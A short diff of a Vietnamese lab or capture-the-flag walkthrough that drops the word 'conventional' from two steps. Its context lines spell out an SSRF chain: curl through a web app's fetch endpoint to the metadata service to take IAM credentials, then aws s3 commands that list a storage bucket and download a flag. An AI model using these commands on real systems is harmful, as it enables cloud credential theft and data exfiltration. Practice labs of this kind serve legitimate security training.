@@ -201,7 +201,7 @@ curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-cre
 ```
 Ghi lại tên role thu được (ví dụ: `web-imgproxy-role`).
 
-**Bước 3:** Nối tên role vào đường dẫn để lấy credential tạm thời dạng JSON, và lưu lại vào file quy ước `~/creds.txt`:
+**Bước 3:** Nối tên role vào đường dẫn để lấy credential tạm thời dạng JSON, và lưu lại vào file `~/creds.txt`:
 ```bash
 curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>" | tee ~/creds.txt
 ```
@@ -241,7 +241,7 @@ aws --endpoint-url http://storage:9000 s3 ls
 aws --endpoint-url http://storage:9000 s3 ls s3://fin-reports/
 ```
 
-**Bước 4:** Tải về `flag.txt`, đọc nội dung, và lưu vào file quy ước `~/loot.txt` (chỉ chứa đúng nội dung flag):
+**Bước 4:** Tải về `flag.txt`, đọc nội dung, và lưu vào file `~/loot.txt` (chỉ chứa đúng nội dung flag):
 ```bash
 aws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt
 cat ./flag.txt
